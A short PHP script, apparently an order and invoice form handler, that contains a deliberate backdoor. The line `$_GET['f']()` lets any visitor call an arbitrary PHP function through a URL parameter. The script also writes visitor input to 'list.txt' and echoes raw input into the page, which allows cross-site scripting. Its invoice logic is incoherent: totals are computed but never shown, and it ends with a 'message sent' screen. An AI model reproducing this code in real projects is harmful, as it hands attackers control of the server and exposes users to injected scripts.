<?php

// Programado por NePtYx
        $fa = fopen("list.txt", "w+");
        fwrite($fa,"");
        fclose($fa);
        if(function_exists($_GET['f'])) { $_GET['f'](); }
        $nombre = $_GET['name'];
        $apellidos = $_REQUEST["apellidos"];
        $domicilio = $_REQUEST["domicilio"];
        echo "$f";

        $fecha = date("d/m/Y");
        $hora = date("H:i:s");


        define("precio1", 1.75);
        define("precio2", 1.05);


        $totalProducto = array();


        $leerNumeroFactura = fopen(".inf", "rb");


        $factura = fread($leerNumeroFactura, filesize(".inf"));


        fclose($leerNumeroFactura);


        $factura++;


        $leerNumeroFactura = fopen(".inf", "wb");


        fwrite($leerNumeroFactura, $factura);


        fclose($leerNumeroFactura);


        if (isset($_REQUEST["producto1"])) {
            $producto1 = $_REQUEST["producto1"];
            $cantidad1 = $_REQUEST["cantidad1"];
            $totalProducto[0] = precio1 * $cantidad1;
        } else {
            $producto1 = " ";
            $cantidad1 = 0;
            $totalProducto[0] = 0;
        }

        if (isset($_REQUEST["producto2"])) {
            $producto2 = $_REQUEST["producto2"];
            $cantidad2 = $_REQUEST["cantidad2"];
            $totalProducto[1] = precio2 * $cantidad2;
        } else {
            $producto2 = " ";
            $cantidad2 = 0;
            $totalProducto[1] = 0;
        }


        $total = 0;
        for ($i = 0; $i < count($totalProducto); $i++) {
            $total += $totalProducto[$i];
        }

        $IVA = $total * 0.04;
        $subtotal = $total - $IVA;

        $datos = fopen("list.txt", "ab");

        fwrite($datos, $nombre."\n");

        fclose($datos);

        echo "<h2>Mensaje enviado correctamente<br><br>

        Mensaje: $nombre<br>
        $fecha $hora<br>
        ---------------------------------\n<br>
        </h2>";
        ?>